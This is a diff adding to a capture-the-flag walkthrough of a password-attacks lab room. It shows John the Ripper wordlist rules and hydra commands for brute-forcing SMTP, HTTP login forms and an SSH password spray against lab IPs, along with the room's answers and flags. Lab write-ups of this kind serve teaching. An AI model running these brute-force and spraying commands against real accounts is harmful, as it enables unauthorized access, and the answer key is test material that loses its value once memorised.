@@ -181,4 +181,61 @@ In /etc/john/john.conf we should write our created rule
 ![Screenshot_20220512_181354](https://user-images.githubusercontent.com/86546994/168072289-5d3fb40e-f8aa-4777-8b4d-be3a59b37aa5.png)
 
 Now, we can create a wordlist using our wordlist 
-ANSWER: 
+
+`john --wordlist=clinic.lst --rules=[Rule name] --stdout > [File where you want to save]`
+
+run the bruteforce attack using generated password
+
+`hydra -l pittman@clinic.thmredteam.com -P [generated list] smtp://[IP]:25`
+
+#### ANSWER: !multidisciplinary00
+
+#### Perform a brute-forcing attack against the phillips account for the login page at http://10.10.187.109/login-get using hydra? What is the flag?
+
+as a password list, we gonna use clinic.lst
+Here you can more about brute forcing login pages - https://russianblogs.com/article/1635894923/
+`hydra -l phillips -P clinic.lst 10.10.6.182 http-get-form "/login-get/index.php:username=phillips&password=^PASS^:S=logout.php" -f`
+
+#### ANSWER: Paracetamol
+
+#### Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.6.182/login-post/. What is the flag?
+
+#### Note: use the clinic.lst dictionary in generating and expanding the wordlist!
+
+we should crate new list using default john the ripper rule - Single-Extra
+`john --wordlist=clinic.lst --rules=Single-Extra --stdout > [File where you want to save]`
+And run the command
+`hydra -l burgess -P generated list [IP] http-post-form "/login-post/index.php:username=burgess&password=^PASS^:S=logout.php" -f`
+
+#### Answer: OxytocinnicotyxO
+
+#### [TASK 9] Password spray attack 
+In this attack, an attacker will brute force logins based on list of usernames with default passwords on the application. For example, an attacker will use one password (say, Secure@123) against many different accounts on the application to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.
+
+#### Perform a password spraying attack to get access to the SSH://10.10.6.182 server to read /etc/flag. What is the flag?
+
+The password format is season+ year + special character, so we need to randomly choose passwords and try to login
+First, lets create a file with usernames like
+admin
+victim
+dummy
+adm
+sammy
+phillips
+burgess
+
+And now, try to login with random pass
+`hydra -L [username list] -p Fall2021@ ssh://[IP]`
+
+After some tries, find that password is Fall2021@
+
+![Screenshot_20220515_135551](https://user-images.githubusercontent.com/86546994/168463016-179560bd-3e37-4f46-a022-25f260f8a377.png)
+
+#### Answer: THM{a97a26e86d09388bbea148f4b870277d}
+
+#### [TASK 10] Summary
+Topics of this room
+    Default, weak, leaked combined wordlists
+    Password profiling
+    Offline password attacks
+    Online password attacks
